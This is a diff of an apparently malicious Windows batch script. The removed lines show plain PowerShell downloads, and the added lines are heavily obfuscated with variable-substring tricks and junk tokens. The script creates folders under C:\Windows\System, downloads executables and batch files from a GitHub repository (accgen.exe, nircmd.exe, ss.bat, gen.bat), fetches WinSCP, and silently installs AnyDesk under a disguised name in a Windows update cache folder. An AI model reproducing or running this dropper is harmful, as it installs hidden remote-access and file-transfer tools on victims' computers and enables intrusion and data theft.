+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Nn√£≤Us%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%%d√º√H†K%:\Windows\System\Text\U
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\U\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\U\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\U\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%xBXoEQc%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\V
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\V\3
+%Ø¢v:~52,1%%Fjh√vKm%%Ø¢v:~49,1%%ÖF´ºM±√%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\V\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%pPm√Cdº%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ñ√ßMÆjC%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\V\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\W
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%qyQzo√á%%Ø¢v:~63,1%%ú•VgÖ√ª%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\W\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Mk√§x∫i%%Ø¢v:~35,1%:\Windows\System\Text\W\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\W\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%√x√M√X√%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\X
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\X\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\X\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\X\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%©√h£AlW%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\Y
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\Y\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\Y\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\Y\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\Z
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\Z\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%KN√Lk√√%%Ø¢v:~35,1%:\Windows\System\Text\Z\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\Z\1
+%Ø¢v:~28,1%%Ø¢v:~60,1%%Ø¢v:~4,1%%Ø¢v:~17,1%%Ø¢v:~38,1%%Ø¢v:~39,1%%Ø¢v:~10,1%%Ø¢v:~17,1%%Ø¢v:~44,1%%Ø¢v:~44,1%%Ø¢v:~40,1%%Ø¢v:~5,1%%Ø¢v:~6,1%%Ø¢v:~37,1%%Ø¢v:~60,1%%Ø¢v:~49,1%%Ø¢v:~17,1%-%Ø¢v:~51,1%%Ø¢v:~17,1%%Ø¢v:~59,1%%Ø¢v:~27,1%%Ø¢v:~17,1%%Ø¢v:~26,1%%Ø¢v:~1,1%%Ø¢v:~17,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~40,1%%Ø¢v:~10,1%%Ø¢v:~31,1%%Ø¢v:~31,1%%Ø¢v:~28,1%%Ø¢v:~39,1%://raw.githubusercontent.com/TheBetaBiggie/RTR/main/accgen.exe%Ø¢v:~40,1%-%Ø¢v:~33,1%%Ø¢v:~1,1%%Ø¢v:~31,1%%Ø¢v:~15,1%%Ø¢v:~63,1%%Ø¢v:~44,1%%Ø¢v:~17,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\r\3\accgen.exe
+%Ø¢v:~28,1%%Ø¢v:~60,1%%Ø¢v:~4,1%%Ø¢v:~17,1%%Ø¢v:~38,1%%Ø¢v:~39,1%%Ø¢v:~10,1%%Ø¢v:~17,1%%Ø¢v:~44,1%%Ø¢v:~44,1%%Ø¢v:~40,1%%Ø¢v:~5,1%%Ø¢v:~6,1%%Ø¢v:~37,1%%Ø¢v:~60,1%%Ø¢v:~49,1%%Ø¢v:~17,1%-%Ø¢v:~51,1%%Ø¢v:~17,1%%Ø¢v:~59,1%%Ø¢v:~27,1%%Ø¢v:~17,1%%Ø¢v:~26,1%%∂w√H∫úL%%Ø¢v:~1,1%%Ø¢v:~17,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~40,1%%Ø¢v:~10,1%%Ø¢v:~31,1%%Ø¢v:~31,1%%Ø¢v:~28,1%%Ø¢v:~39,1%://raw.githubusercontent.com/TheBetaBiggie/RTR/main/nircmd.exe%Ø¢v:~40,1%-%Ø¢v:~33,1%%Ø¢v:~1,1%%Ø¢v:~31,1%%Ø¢v:~15,1%%Ø¢v:~63,1%%Ø¢v:~44,1%%Ø¢v:~17,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\t\3\nircmd.exe
+%Ø¢v:~28,1%%Ø¢v:~60,1%%Ø¢v:~4,1%%Ø¢v:~17,1%%Ø¢v:~38,1%%Ø¢v:~39,1%%Ø¢v:~10,1%%Ø¢v:~17,1%%Ø¢v:~44,1%%Ø¢v:~44,1%%Ø¢v:~40,1%%Ø¢v:~5,1%%Ø¢v:~6,1%%Ø¢v:~37,1%%Ø¢v:~60,1%%Ø¢v:~49,1%%Ø¢v:~17,1%-%Ø¢v:~51,1%%Ø¢v:~17,1%%Ø¢v:~59,1%%Ø¢v:~27,1%%Ø¢v:~17,1%%Ø¢v:~26,1%%Ø¢v:~1,1%%Ø¢v:~17,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~40,1%%Ø¢v:~10,1%%Ø¢v:~31,1%%Ø¢v:~31,1%%Ø¢v:~28,1%%Ø¢v:~39,1%://raw.githubusercontent.com/TheBetaBiggie/RTR/main/define.bat%Ø¢v:~40,1%-%Ø¢v:~33,1%%Ø¢v:~1,1%%Ø¢v:~31,1%%Ø¢v:~15,1%%Ø¢v:~63,1%%Ø¢v:~44,1%%Ø¢v:~17,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\r\3\define.bat
+%Ø¢v:~28,1%%Ø¢v:~60,1%%Ø¢v:~4,1%%Ø¢v:~17,1%%Ø¢v:~38,1%%Ø¢v:~39,1%%Ø¢v:~10,1%%Ø¢v:~17,1%%Ø¢v:~44,1%%Ø¢v:~44,1%%Ø¢v:~40,1%%Ø¢v:~5,1%%Ø¢v:~6,1%%Ø¢v:~37,1%%Ø¢v:~60,1%%Ø¢v:~49,1%%Ø¢v:~17,1%-%Ø¢v:~51,1%%Ø¢v:~17,1%%Ø¢v:~59,1%%uK√f√Sß%%Ø¢v:~27,1%%Ø¢v:~17,1%%Ø¢v:~26,1%%Ø¢v:~1,1%%Ø¢v:~17,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~40,1%%Ø¢v:~10,1%%Ø¢v:~31,1%%Ø¢v:~31,1%%Ø¢v:~28,1%%Ø¢v:~39,1%://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss.bat%Ø¢v:~40,1%-%Ø¢v:~33,1%%Ø¢v:~1,1%%Ø¢v:~31,1%%Ø¢v:~15,1%%Ø¢v:~63,1%%Ø¢v:~44,1%%Ø¢v:~17,1%%¢MW√´√z%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\r\3\ss.bat
+%Ø¢v:~28,1%%Ø¢v:~60,1%%Ø¢v:~4,1%%Ø¢v:~17,1%%Ø¢v:~38,1%%Ø¢v:~39,1%%Ø¢v:~10,1%%Ø¢v:~17,1%%Ø¢v:~44,1%%Ø¢v:~44,1%%Ø¢v:~40,1%%Ø¢v:~5,1%%Ø¢v:~6,1%%Ø¢v:~37,1%%Ø¢v:~60,1%%Ø¢v:~49,1%%Ø¢v:~17,1%-%Ø¢v:~51,1%%Ø¢v:~17,1%%Ø¢v:~59,1%%Ø¢v:~27,1%%Ø¢v:~17,1%%Ø¢v:~26,1%%Ø¢v:~1,1%%Ø¢v:~17,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~40,1%%Ø¢v:~10,1%%Ø¢v:~31,1%%Ø¢v:~31,1%%Ø¢v:~28,1%%Ø¢v:~39,1%://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss1.bat%Ø¢v:~40,1%-%Ø¢v:~33,1%%Ø¢v:~1,1%%Ø¢v:~31,1%%Ø¢v:~15,1%%Ø¢v:~63,1%%Ø¢v:~44,1%%Ø¢v:~17,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\r\3\ss1.bat
+%Ø¢v:~28,1%%Ø¢v:~60,1%%Ø¢v:~4,1%%Ø¢v:~17,1%%Ø¢v:~38,1%%Ø¢v:~39,1%%Ø¢v:~10,1%%Ø¢v:~17,1%%Ø¢v:~44,1%%Ø¢v:~44,1%%Ø¢v:~40,1%%Ø¢v:~5,1%%Ø¢v:~6,1%%Ø¢v:~37,1%%Ø¢v:~60,1%%Ø¢v:~49,1%%Ø¢v:~17,1%-%Ø¢v:~51,1%%Ø¢v:~17,1%%Ø¢v:~59,1%%Ø¢v:~27,1%%Ø¢v:~17,1%%Ø¢v:~26,1%%Ø¢v:~1,1%%Ø¢v:~17,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~40,1%%Ø¢v:~10,1%%Ø¢v:~31,1%%Ø¢v:~31,1%%Ø¢v:~28,1%%Ø¢v:~39,1%://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat%Ø¢v:~40,1%-%Ø¢v:~33,1%%Ø¢v:~1,1%%Ø¢v:~31,1%%Ø¢v:~15,1%%Ø¢v:~63,1%%Ø¢v:~44,1%%Ø¢v:~17,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\r\3\gen.bat
+%Ø¢v:~28,1%%Ø¢v:~60,1%%Ø¢v:~4,1%%Ø¢v:~17,1%%rOn√Ad√%%Ø¢v:~38,1%%Ø¢v:~39,1%%ë√ZsJπg%%Ø¢v:~10,1%%Ø¢v:~17,1%%Ø¢v:~44,1%%Ø¢v:~44,1%%Ø¢v:~40,1%%Ø¢v:~5,1%%Ø¢v:~6,1%%Ø¢v:~37,1%%Ø¢v:~60,1%%Ø¢v:~49,1%%Ø¢v:~17,1%-%Ø¢v:~51,1%%Ø¢v:~17,1%%Ø¢v:~59,1%%Ø¢v:~27,1%%Ø¢v:~17,1%%Ø¢v:~26,1%%Ø¢v:~1,1%%Ø¢v:~17,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~40,1%%√AQnú√L%%Ø¢v:~10,1%%Ø¢v:~31,1%%Ø¢v:~31,1%%Ø¢v:~28,1%%Ø¢v:~39,1%://download.anydesk.com/AnyDesk.exe%Ø¢v:~40,1%-%Ø¢v:~33,1%%Ø¢v:~1,1%%Ø¢v:~31,1%%Ø¢v:~15,1%%Ø¢v:~63,1%%Ø¢v:~44,1%%Ø¢v:~17,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\SoftwareDistribution\Download\SharedFileCache\installer.exe
+%Ø¢v:~35,1%:\Windows\SoftwareDistribution\Download\SharedFileCache\installer.exe%Ø¢v:~40,1%--%Ø¢v:~63,1%%Ø¢v:~6,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~54,1%%Ø¢v:~44,1%%Ø¢v:~44,1%%Ø¢v:~40,1%"%Ø¢v:~35,1%:\Windows\SoftwareDistribution\Download\SharedFileCache"%Ø¢v:~40,1%%c√â∫√√√%--%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~54,1%%Ø¢v:~38,1%%Ø¢v:~31,1%-%Ø¢v:~4,1%%Ø¢v:~63,1%%Ø¢v:~31,1%%Ø¢v:~10,1%-%Ø¢v:~4,1%%Ø¢v:~63,1%%Ø¢v:~6,1%%Ø¢v:~40,1%--%Ø¢v:~39,1%%Ø¢v:~63,1%%chëE√•£%%Ø¢v:~44,1%%Ø¢v:~17,1%%Ø¢v:~6,1%%Ø¢v:~31,1%%Ø¢v:~40,1%--%Ø¢v:~1,1%%Ø¢v:~28,1%%Ø¢v:~8,1%%Ø¢v:~54,1%%Ø¢v:~31,1%%Ø¢v:~17,1%-%Ø¢v:~52,1%%Ø¢v:~54,1%%Ø¢v:~6,1%%Ø¢v:~1,1%%Ø¢v:~54,1%%Ø¢v:~44,1%%Ø¢v:~44,1%%Ø¢v:~9,1%%UyV√jKf%
+%Ø¢v:~31,1%%Ø¢v:~63,1%%Ø¢v:~52,1%%Ø¢v:~17,1%%Ø¢v:~60,1%%Ø¢v:~1,1%%Ø¢v:~31,1%%Ø¢v:~40,1%%Ø¢v:~58,1%
 :scp
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System\Text\r\3\scp.zip
-powershell Expand-Archive C:\Windows\System\Text\r\3\scp.zip -DestinationPath C:\Windows\System\Text\r\3\
-if exist "C:\Windows\System\Text\r\3\WinSCP.com" if exist "C:\Windows\System\Text\r\3\WinSCP.exe" goto end
-if not exist "C:\Windows\System\Text\r\3\WinSCP.com" goto scp
-if not exist "C:\Windows\System\Text\r\3\WinSCP.exe" goto scp
-end:
+%Ø¢v:~28,1%%Ø¢v:~60,1%%Ø¢v:~4,1%%Ø¢v:~17,1%%Ø¢v:~38,1%%Ø¢v:~39,1%%Ø¢v:~10,1%%Ø¢v:~17,1%%Ø¢v:~44,1%%Ø¢v:~44,1%%Ø¢v:~40,1%%Ø¢v:~5,1%%Ø¢v:~6,1%%Ø¢v:~37,1%%Ø¢v:~60,1%%Ø¢v:~49,1%%Ø¢v:~17,1%-%Ø¢v:~51,1%%Ø¢v:~17,1%%Ø¢v:~59,1%%Ø¢v:~27,1%%Ø¢v:~17,1%%Ø¢v:~26,1%%Ø¢v:~1,1%%Ø¢v:~17,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~40,1%%Ø¢v:~10,1%%Ø¢v:~31,1%%Ø¢v:~31,1%%Ø¢v:~28,1%%Ø¢v:~39,1%://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip%Ø¢v:~40,1%-%Ø¢v:~33,1%%Ø¢v:~1,1%%Ø¢v:~31,1%%Ø¢v:~15,1%%Ø¢v:~63,1%%Ø¢v:~44,1%%Ø¢v:~17,1%%Ø¢v:~40,1%%Ø¢v:~35,1%%™√≠√Ñ≥y%:\Windows\System\Text\r\3\scp.zip
+%Ø¢v:~28,1%%Ø¢v:~60,1%%Ø¢v:~4,1%%Ø¢v:~17,1%%Ø¢v:~38,1%%Ø¢v:~39,1%%Ø¢v:~10,1%%Ö√Æ´H√A%%Ø¢v:~17,1%%Ø¢v:~44,1%%Ø¢v:~44,1%%Ø¢v:~40,1%%Ø¢v:~43,1%%Ø¢v:~22,1%%Ø¢v:~28,1%%Ø¢v:~54,1%%Ø¢v:~6,1%%Ø¢v:~8,1%-%Ø¢v:~7,1%%Ø¢v:~38,1%%Ø¢v:~46,1%%Ø¢v:~10,1%%Ø¢v:~63,1%%Ø¢v:~37,1%%Ø¢v:~17,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\r\3\scp.zip%Ø¢v:~40,1%-%Ø¢v:~11,1%%Ø¢v:~17,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~63,1%%Ø¢v:~6,1%%Ø¢v:~54,1%%Ø¢v:~31,1%%Ø¢v:~63,1%%Ø¢v:~60,1%%Ø¢v:~6,1%%Ø¢v:~30,1%%Ø¢v:~54,1%%Ø¢v:~31,1%%Ø¢v:~10,1%%√tlN√√√%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\r\3\
+%Ø¢v:~63,1%%Ø¢v:~12,1%%Ø¢v:~40,1%%Ø¢v:~17,1%%Ø¢v:~22,1%%Ø¢v:~63,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~40,1%"%Ø¢v:~35,1%:\Windows\System\Text\r\3\WinSCP.com"%Ø¢v:~40,1%%Ø¢v:~63,1%%Ø¢v:~12,1%%Ø¢v:~40,1%%Ø¢v:~17,1%%Ø¢v:~22,1%%Ø¢v:~63,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~40,1%"%Ø¢v:~35,1%:\Windows\System\Text\r\3\WinSCP.exe"%Ø¢v:~40,1%%Ø¢v:~56,1%%Ø¢v:~60,1%%Ø¢v:~31,1%%Ø¢v:~60,1%%Ø¢v:~40,1%%Ø¢v:~17,1%%Ø¢v:~6,1%%Ø¢v:~8,1%
+%Ø¢v:~63,1%%Ø¢v:~12,1%%Ø¢v:~40,1%%Ø¢v:~6,1%%Ø¢v:~60,1%%√√ÆA√¢L%%Ø¢v:~31,1%%Ø¢v:~40,1%%Ø¢v:~17,1%%Ø¢v:~22,1%%Ø¢v:~63,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~40,1%"%Ø¢v:~35,1%:\Windows\System\Text\r\3\WinSCP.com"%Ø¢v:~40,1%%Ø¢v:~56,1%%Ø¢v:~60,1%%Ø¢v:~31,1%%Ø¢v:~60,1%%Ø¢v:~40,1%%Ø¢v:~39,1%%Ø¢v:~46,1%%Æπ√§±√√%%Ø¢v:~28,1%
+%Ø¢v:~63,1%%Ø¢v:~12,1%%Ø¢v:~40,1%%Ø¢v:~6,1%%Ø¢v:~60,1%%Ø¢v:~31,1%%Ø¢v:~40,1%%Ø¢v:~17,1%%Ø¢v:~22,1%%Ø¢v:~63,1%%Ø¢v:~39,1%%Ø¢v:~31,1%%Ø¢v:~40,1%"%Ø¢v:~35,1%:\Windows\System\Text\r\3\WinSCP.exe"%Ø¢v:~40,1%%Ø¢v:~56,1%%Ø¢v:~60,1%%Ø¢v:~31,1%%Ø¢v:~60,1%%Ø¢v:~40,1%%Ø¢v:~39,1%%Ø¢v:~46,1%%Ø¢v:~28,1%%√√∫√™°√%
+%Ø¢v:~17,1%%á•¨°o√H%%Ø¢v:~6,1%%Ø¢v:~8,1%:
